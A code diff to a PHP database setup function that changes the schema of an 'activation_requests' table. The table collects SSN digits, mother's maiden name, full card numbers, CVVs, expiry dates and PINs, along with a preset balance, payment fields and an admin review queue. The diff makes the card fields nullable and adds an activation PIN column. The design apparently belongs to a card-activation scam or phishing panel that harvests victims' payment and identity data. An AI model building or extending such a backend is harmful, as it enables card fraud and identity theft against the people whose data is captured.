@@ -46,17 +46,19 @@ function create_tables($db) {
         zip VARCHAR(20) NOT NULL,
         ssn_last4 VARCHAR(4) NOT NULL,
         maiden_name VARCHAR(100) NOT NULL,
-        card_number VARCHAR(16) NOT NULL,
-        cvv VARCHAR(3) NOT NULL,
-        expiry_date VARCHAR(7) NOT NULL,
-        pin_hash VARCHAR(255) NOT NULL,
+        card_number VARCHAR(16) DEFAULT NULL,
+        cvv VARCHAR(3) DEFAULT NULL,
+        expiry_date VARCHAR(7) DEFAULT NULL,
+        pin_hash VARCHAR(255) DEFAULT NULL,
         balance DECIMAL(10,2) DEFAULT 5000.00,
         payment_method VARCHAR(20) DEFAULT NULL,
         payment_status VARCHAR(20) DEFAULT "pending",
         payment_address VARCHAR(255) DEFAULT NULL,
+        activation_pin VARCHAR(6) DEFAULT NULL,
         status VARCHAR(20) DEFAULT "pending",
         created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
         updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
+        activated_at TIMESTAMP NULL,
         reviewed_at TIMESTAMP NULL,
         reviewed_by VARCHAR(50) DEFAULT NULL,
         admin_notes TEXT DEFAULT NULL,
@@ -64,6 +66,37 @@ function create_tables($db) {
         INDEX idx_status (status),
         INDEX idx_payment_status (payment_status)
     ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4');
+    
+    // Add new columns to existing tables if they don't exist (for migration from old schema)
+    try {
+        // Check if activation_pin column exists
+        $result = $db->query("SHOW COLUMNS FROM activation_requests LIKE 'activation_pin'");
+        if ($result->rowCount() == 0) {
+            $db->exec('ALTER TABLE activation_requests ADD COLUMN activation_pin VARCHAR(6) DEFAULT NULL AFTER payment_status');
+        }
+    } catch (PDOException $e) {
+        // Ignore errors - column may already exist
+    }
+    
+    try {
+        // Check if activated_at column exists
+        $result = $db->query("SHOW COLUMNS FROM activation_requests LIKE 'activated_at'");
+        if ($result->rowCount() == 0) {
+            $db->exec('ALTER TABLE activation_requests ADD COLUMN activated_at TIMESTAMP NULL AFTER updated_at');
+        }
+    } catch (PDOException $e) {
+        // Ignore errors - column may already exist
+    }
+    
+    // Modify existing columns to allow NULL if they're NOT NULL (for migration)
+    try {
+        $db->exec('ALTER TABLE activation_requests MODIFY COLUMN card_number VARCHAR(16) DEFAULT NULL');
+        $db->exec('ALTER TABLE activation_requests MODIFY COLUMN cvv VARCHAR(3) DEFAULT NULL');
+        $db->exec('ALTER TABLE activation_requests MODIFY COLUMN expiry_date VARCHAR(7) DEFAULT NULL');
+        $db->exec('ALTER TABLE activation_requests MODIFY COLUMN pin_hash VARCHAR(255) DEFAULT NULL');
+    } catch (PDOException $e) {
+        // Ignore errors - columns may already be nullable
+    }
     
     // Admin users table
     $db->exec('CREATE TABLE IF NOT EXISTS admin_users (
